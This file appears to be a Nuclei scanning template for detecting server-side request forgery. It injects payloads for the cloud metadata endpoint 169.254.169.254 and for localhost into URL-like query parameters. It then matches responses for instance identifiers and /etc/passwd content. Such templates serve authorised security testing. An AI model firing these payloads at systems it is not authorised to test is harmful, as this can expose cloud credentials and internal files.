id: nawab-smart-ssrf

info:
  name: 🛸 Nawab-Smart-SSRF-Scanner 🛸
  author: thenawabx
  severity: critical

http:
  - method: GET
    path:
      - "{{BaseURL}}"

    payloads:
      ssrf_targets:
        - "http://169.254.169.254/latest/meta-data/"
        - "http://localhost:80"

    fuzzing:
      - part: query
        keys:
          - "url"
          - "uri"
          - "path"
          - "file"
          - "redirect"
        type: replace
        fuzz:
          - "{{ssrf_targets}}"

    matchers:
      - type: regex
        name: "🛸🛸 [FOUND] SSRF-CRITICAL: INTERNAL-HIT 🛸🛸"
        regex:
          - "ami-id"
          - "instance-id"
          - "root:x:0:0"
        part: body
